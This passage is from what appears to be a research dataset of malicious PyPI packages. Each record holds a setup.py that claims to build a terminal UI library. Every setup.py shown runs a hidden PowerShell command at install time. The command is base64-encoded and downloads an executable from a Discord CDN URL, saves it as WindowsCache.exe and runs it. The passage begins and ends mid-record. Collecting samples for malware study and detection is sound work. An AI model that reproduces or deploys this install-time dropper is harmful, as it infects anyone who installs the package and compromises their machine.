'esqurlosinthydra',\n    packages = ['modlib'],\n    version = '6.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqverosintint-v4.74",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqverosintint',\n    packages = ['modlib'],\n    version = '4.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqvirtualintpep-v2.60",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvirtualintpep',\n    packages = ['modlib'],\n    version = '4.82',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqvirtualkillsuper-v9.16",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvirtualkillsuper',\n    packages = ['modlib'],\n    version = '8.43',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqvisavirtualencode-v2.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvisavirtualencode',\n    packages = ['modlib'],\n    version = '10.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libcandyadhydra-v9.66",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcandyadhydra',\n    packages = ['modlib'],\n    version = '4.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libencodepypost-v8.42",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libencodepypost',\n    packages = ['modlib'],\n    version = '7.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libhackedosintvm-v2.26",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhackedosintvm',\n    packages = ['modlib'],\n    version = '3.88',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libintcpusplit-v3.42",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libintcpusplit',\n    packages = ['modlib'],\n    version = '2.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libintultrapyw-v2.39",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libintultrapyw',\n    packages = ['modlib'],\n    version = '3.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-liblgtbkillhacked-v6.98",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libLGTBkillhacked',\n    packages = ['modlib'],\n    version = '4.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libloadhackedpyw-v8.65",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libloadhackedpyw',\n    packages = ['modlib'],\n    version = '3.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libmaskosinthydra-v4.82",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libmaskosinthydra',\n    packages = ['modlib'],\n    version = '1.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libnvidiareplacerandom-v3.3",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libnvidiareplacerandom',\n    packages = ['modlib'],\n    version = '5.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libnvidiasplitpep-v7.70",
